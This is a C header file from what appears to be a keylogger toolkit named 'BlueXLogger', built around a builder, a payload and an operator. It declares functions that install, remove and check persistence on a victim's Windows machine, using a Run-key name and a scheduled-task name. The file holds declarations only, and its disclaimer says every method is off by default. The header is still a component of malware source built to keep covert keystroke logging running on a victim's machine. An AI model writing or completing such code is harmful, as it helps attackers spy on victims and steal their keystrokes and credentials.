/*============================================================================
 * BlueXLogger - bxl_persist.h
 * Optional persistence mechanisms.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * IMPORTANT: every method here is OFF by default. The builder exposes them
 * behind an explicit operator choice, and the payload only ever acts on what
 * the operator configured.
 *==========================================================================*/
#ifndef BXL_PERSIST_H
#define BXL_PERSIST_H

#include "bxl_common.h"
#include "bxl_config.h"

#define BXL_RUNKEY_NAME  L"BlueXLogger"
#define BXL_TASK_NAME    L"BlueXLogger"

/* Apply the configured persistence method. No-op when set to BXL_PERSIST_OFF. */
int  bxl_persist_apply(int method, const wchar_t *exe_path);

/* Install / remove a specific method. */
int  bxl_persist_install(int method, const wchar_t *exe_path);
int  bxl_persist_remove(int method);

/* Query current state. */
int  bxl_persist_is_installed(int method);

/* Human-readable method name. */
const char *bxl_persist_name(int method);

#endif /* BXL_PERSIST_H */
